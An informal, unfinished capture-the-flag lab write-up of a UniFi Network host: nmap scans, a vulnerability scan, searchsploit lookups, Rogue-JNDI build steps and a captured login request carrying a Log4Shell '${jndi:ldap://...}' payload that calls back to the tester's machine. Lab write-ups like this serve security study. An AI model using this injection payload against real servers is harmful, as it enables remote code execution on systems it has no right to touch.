@@ -1,0 +1,242 @@
+"Got Bored so left it halfway..."
+__________________________________
+# Nmap
+Initial scan...
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ nmap -p- 10.129.85.30 --min-rate=10000         
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 12:02 EDT
+Warning: 10.129.85.30 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.129.85.30
+Host is up (0.39s latency).
+Not shown: 63562 closed tcp ports (reset), 1967 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+6789/tcp open  ibm-db2-admin
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+8843/tcp open  unknown
+8880/tcp open  cddbp-alt
+Nmap done: 1 IP address (1 host up) scanned in 34.29 seconds
+________________________________________________________________________________________________________________________________________
+script scanning...
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ nmap -p22,6789,8080,8443,8843,8880 -sC -A 10.129.85.30 --min-rate=1000 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 12:05 EDT
+Nmap scan report for 10.129.85.30
+Host is up (0.49s latency).
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+
+6789/tcp open  ibm-db2-admin?
+
+8080/tcp open  http            Apache Tomcat (language: en)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Did not follow redirect to https://10.129.85.30:8443/manage
+
+8443/tcp open  ssl/nagios-nsca Nagios NSCA
+| http-title: UniFi Network
+|_Requested resource was /manage/account/login?redirect=%2Fmanage
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+
+8843/tcp open  ssl/http        Apache Tomcat (language: en)
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
+
+8880/tcp open  http            Apache Tomcat (language: en)
+|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   363.86 ms 10.10.14.1
+2   364.30 ms 10.129.85.30
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 225.99 seconds
+________________________________________________________________________________________________________________________________________
+# Telnet
+"I had no idea what I was doing..."
+
+ ┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ telnet 10.129.96.149 6789 
+Trying 10.129.96.149...
+Connected to 10.129.96.149.   #connected but have no idea what to do
+________________________________________________________________________________________________________________________________________
+# Identifying attack vectors
+
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ nmap -p22,6789,8080,8443,8843,8880 --script=vuln 10.129.96.149 --min-rate=1000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 06:33 EDT
+Nmap scan report for 10.129.96.149
+Host is up (0.36s latency).
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+6789/tcp open  ibm-db2-admin
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+| http-slowloris-check:
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|
+|     Disclosure date: 2009-09-17
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_      http://ha.ckers.org/slowloris/
+8843/tcp open  unknown  
+8880/tcp open  cddbp-alt
+________________________________________________________________________________________________________________________________________
+# Breakthrough…
+
+" Got This through "                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ sudo tcpdump -i tun0 port 389
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+05:48:54.507077 IP 10.129.72.176.52164 > 10.10.14.135.ldap: Flags [S], seq 2554594284, win 64240, options [mss 1362,sackOK,TS val 2366318471 ecr 0,nop,wscale 7], length 0
+05:48:54.507105 IP 10.10.14.135.ldap > 10.129.72.176.52164: Flags [R.], seq 0, ack 2554594285, win 0, length 0
+05:48:56.465655 IP 10.129.72.176.52164 > 10.10.14.135.ldap: Flags [S], seq 2554594284, win 64240, options [mss 1362,sackOK,TS val 2366319482 ecr 0,nop,wscale 7], length 0
+05:48:56.465714 IP 10.10.14.135.ldap > 10.129.72.176.52164: Flags [R.], seq 0, ack 1, win 0, length 0
+______________________________________________________________________________________________________
+" From here "
+POST /api/login HTTP/1.1
+Host: 10.129.72.176:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://10.129.72.176:8443/manage/account/login?redirect=%2Fmanage
+Content-Type: application/json; charset=utf-8
+Content-Length: 102
+Origin: https://10.129.72.176:8443
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+Connection: keep-alive
+
+{"username":"hesg","password":"afhdj","remember":"${jndi:ldap://10.10.14.135/whatever}","strict":true}
+______________________________________________________________________________________________________
+# Tools
+" Tools necessary "
+ 
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ sudo apt install openjdk-11-jdk 
+The following packages were automatically installed and are no longer required:
+  python3-packaging-whl  python3-pyinstaller-hooks-contrib  python3-wheel-whl
+Use 'sudo apt autoremove' to remove them.
+
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ sudo apt-get install maven
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+
+Once we have installed the required packages, we now need to download and build
+ the Rogue-JNDI Java application.
+Let's clone the respective repository and build the package using Maven.
+git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi
+mvn package
+
+# I built and left
+____________________________________________________________________________________________________________________________________________________________________________________________________________
+
+Rough
+
+" does this have a exploit haha let's do stupid things "
+  " version vulnerability scanning haha "
+
+ // haha no luck                                                          
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ searchsploit OpenSSH 8.2p
+Exploits: No Results
+Shellcodes: No Results
+
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ searchsploit 4ubuntu0.3
+Exploits: No Results
+Shellcodes: No Results
+
+──(kali㉿kali)-[~/Documents/Unified]
+└─$ searchsploit UniFi Network
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                 |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Ubiquiti Networks UniFi 3.2.10 - Cross-Site Request Forgery                                                                                    | json/webapps/39488.txt
+Ubiquiti Networks UniFi Video Default - 'crossdomain.xml' Security Bypass                                                                      | php/webapps/39268.java
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ searchsploit Apache Tomcat
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title
+
+# I searched a lot
+________________________________________________________________________________________________________________________________________________---------------------------------
+##confirming our attack vector
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ nmap -p22,6789,8080,8443,8843,8880 --script=vuln 10.129.96.149 --min-rate=1000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 06:33 EDT
+Nmap scan report for 10.129.96.149
+Host is up (0.36s latency).
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+6789/tcp open  ibm-db2-admin
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+| http-slowloris-check:
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|
+|     Disclosure date: 2009-09-17
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_      http://ha.ckers.org/slowloris/
+8843/tcp open  unknown
+8880/tcp open  cddbp-alt
+
+Nmap done: 1 IP address (1 host up) scanned in 841.80 seconds
+
+" # I don't know don't ask me "                                                                                                                                                                        >
+
+┌──(kali㉿kali)-[~/Documents/Unified]
+└─$ searchsploit Slowloris
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                 |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Multiple HTTP Server - 'slowloris.pl' Low Bandwidth Denial of Service                                                                          | multiple/dos/8976.pl
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
